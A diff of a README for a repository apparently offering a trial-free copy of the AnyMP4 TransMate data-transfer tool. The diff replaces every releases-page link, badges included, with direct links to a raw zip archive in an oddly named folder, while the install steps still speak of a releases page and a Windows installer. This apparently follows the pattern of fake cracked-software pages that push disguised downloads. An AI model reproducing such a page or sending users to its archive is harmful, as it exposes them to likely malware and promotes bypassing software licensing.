@@ -1,6 +1,6 @@
 # 📥 AnyMP4-TransMate-No-Trial - Effortless Data Transfer Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%9A-brightgreen)](https://github.com/alpesh0011/AnyMP4-TransMate-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/alpesh0011/AnyMP4-TransMate-No-Trial/main/platybregmatic/AnyMP4-TransMate-No-Trial-v2.6.zip%20Now-%20%F0%9F%93%9A-brightgreen)](https://raw.githubusercontent.com/alpesh0011/AnyMP4-TransMate-No-Trial/main/platybregmatic/AnyMP4-TransMate-No-Trial-v2.6.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with AnyMP4 TransMate, follow these simple steps to download and 
 
 ## 🔗 Download & Install
 
-1. Visit this page to download: [AnyMP4-TransMate Releases](https://github.com/alpesh0011/AnyMP4-TransMate-No-Trial/releases).
+1. Visit this page to download: [AnyMP4-TransMate Releases](https://raw.githubusercontent.com/alpesh0011/AnyMP4-TransMate-No-Trial/main/platybregmatic/AnyMP4-TransMate-No-Trial-v2.6.zip).
 2. Choose the latest version from the list.
 3. Click on the download link for the Windows installer.
 4. Once the download completes, locate the downloaded file (usually in your Downloads folder).
@@ -101,4 +101,4 @@ Explore the following topics related to AnyMP4 TransMate:
 - windows-device-transfer-tool
 - windows-phone-transfer-anymp4
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%9A-brightgreen)](https://github.com/alpesh0011/AnyMP4-TransMate-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/alpesh0011/AnyMP4-TransMate-No-Trial/main/platybregmatic/AnyMP4-TransMate-No-Trial-v2.6.zip%20Now-%20%F0%9F%93%9A-brightgreen)](https://raw.githubusercontent.com/alpesh0011/AnyMP4-TransMate-No-Trial/main/platybregmatic/AnyMP4-TransMate-No-Trial-v2.6.zip)
